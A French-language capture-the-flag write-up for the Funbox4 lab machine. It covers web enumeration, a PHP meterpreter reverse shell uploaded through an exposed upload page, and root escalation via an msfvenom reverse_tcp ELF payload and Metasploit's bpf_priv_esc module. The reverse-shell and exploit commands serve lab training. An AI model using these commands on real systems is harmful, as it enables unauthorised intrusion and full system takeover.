# Funbox4 : CTF

L'objectif de cette VM est de trouver le flag sur la machine cible en utilisant une élévation de droit.

## Sommaire

1. [Mise en place](#mise-en-place)
2. [Site Internet](#Site-internet)
3. [Script PHP](#Script-PHP)
4. [Augmentation des droits](#Augmentation-des-droits)

## Mise en place

Adresse IP hôte : **192.168.1.51**

Adresse IP cible : **192.168.1.23**

Ports disponibles :

![nmap](./images/nmap.png)

## Site internet

Le site internet est ce qu'il semble être le plus simple à attaquer.

![site](./images/port80.png)

Nous avons pour l'instant seulement accès à la page par défaut de apache.

Utilisons `dirb` et `nikto` pour voir s'il y a des vulnérabilités.

`sudo dirb http://192.168.1.23` 

![dirb](./images/dirb.png)

`nikto -h 192.168.1.23 80` 

![nikto](./images/nikto.png)

Pour l'instant, rien ne ressort réellement.

Sans trop savoir, j'utilise `wpscan` au cas où le site utiliserai WordPress.

![wpscan](./images/wpscan.png)

Par hasard, essayons de voir ce que donne le `/robots.txt`.

![robots](./images/robots.png)

Ça ne marche pas. Cependant, sur la page Vulhub, l'auteur de ce CTF mentionne une histoire de majuscule. On peut tenter des routes avec des premières lettres en majuscules ou des noms complets en majuscules.

![capIndex](./images/capsIndex.png)

![capServ](./images/capsServStat.png)

![capRob](./images/disallow1.png)

![capRob2](./images/disallow2.png)

Ok, super maintenant, on a une piste. Regardons ce que contient ces dossiers/fichiers.

![dirIgm](./images/dirigm.png)

![dirUp](./images/dirupload.png)

`/igmseklhgmrjmtherij2145236` existe, on n'y a juste pas accès. Avec cette info, trouvons s'il existe des sous-dossiers grâce à `dirbuster`. Pour augmenter le nombre d'essais, on va utiliser le fichier `directory-list-2.3-medium.txt`.

![dirbuster1](./images/dirbuster1.png)

![dirbuster2](./images/dirbuster2.png)

On obtient plusieurs résultats tels que `/upload`, `/upload.php` et `upload.html`.

Voyons ce que donne cette page php.

![upPhp](./images/upload.php.png)

Donc, on a accès à une page nous permettant d'upload des fichiers sur la machine cible. On peut alors comme dans un des tps précédents, utiliser un script php pour se connecter avec un shell à la machine cible.

## Script PHP

Pour ce faire, on va utiliser `metasploit`.

On choisit d'utiliser le payload `php/meterpreter/reverse_tcp` et on paramètre l'adresse local et le port local.

![exploit1](./images/exploit1.png)

Ensuite, il faut upload via le site notre script php malveillant. On va ici réutiliser celui du tp précédent.

![exploit2](./images/exploit2.png)

Pour activer la connexion, on essaye de se connecter au fichier uploadé.

![exploit3](./images/exploit3.png)

Ensuite on retourne sur metasploit.

![exploit4](./images/exploit4.png)

![ls](./images/lsHome.png)

Nous voici sur la machine cible. On peut se balader sur la machine à présent.

![lsRoot](./images/lsRoot.png)

Dans ce dossier se trouve un fichier `hint.txt`, voyons ce qu'il contient.

![hint](./images/hint.png)

Il y a 3 messages codés dans ce fichiers.

Le premier est encodé en brainfuck, un langage de programmation conçu pour avoir le plus petit compilateur possible.

![brainfuck](./images/brainfuck.png)

Le deuxième message est encodé en base64.

![base64](./images/base64.png)

L'auteur est un petit rigolo.

Le troisième message est encodé en base32.

![base32](./images/base32.png)

Ok, donc on doit chercher un fichier `todos` qui doit contenir de nouveaux indices pour la suite.

![todos](./images/lsTomas.png)

La première étape est de vérifier les backups.

![backups](./images/backups.png)

Il y a des fichiers intéressants, tels que `passwd.bak` mais on n'a pas les droits pour l'ouvrir.

Ça semble être une impasse, alors le plus simple est d'augmenter nos droits afin de pouvoir faire ce que l'on veut sur la machine cible en se connectant en root.

## Augmentation de droits

De la même manière que pour le script php, on va uploader un fichier malveillant sur la machine cible grâce à metasploit.

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.51 LPORT=5555 -f elf -o escalate.elf` 

![escalate1](./images/escalate1.png)

![escalate2](./images/escalate2.png)

Maintenant via notre shell connecté à la machine cible, on va déplacer ce fichier dans le dossier `/tmp` afin de pouvoir l'exécuter.

![escalate4](./images/escalate3.png)

![escalate4](./images/escalate5.png)

Dans une nouvelle instance de metasploit, il faut lancer un listener de la même manière qu'avec le script php.

![escalate6](./images/escalate6.png)

On execute le fichier `escalate.elf`.

![escalate1000](./images/escalate8.png)

Voici la première partie de faite, mais nous n'avons pas encore le droit root. Pour ce faire, on doit lancer un nouvel exploit. On met de côté la session meterpreter que l'on vient de lancer. Pour trouver un exploit qui fonctionnera sur ce système, on peut utiliser une fonction metasploit.

`use post/multi/recon/local_exploit_suggester`

Pour que cela fonctionne, il faut définir la session metasploit à utiliser.

![exploitsug](./images/exploitsug.png)

![sugRes](./images/exploitsugres.png)

On a un bon choix d'exploit disponible, disons que l'on va utiliser le premier.

`use exploit/linux/local/bpf_priv_esc`

![exploitloc](./images/setEscalation.png)

![root1](./images/root1.png)

Nous sommes à présent connecté à la machine cible en root, ce qui nous permet d'accéder au flag. Il suffit maintenant de le trouver.

![flag](./images/flag.png)

Après quelques minutes de recherche, voici le flag.
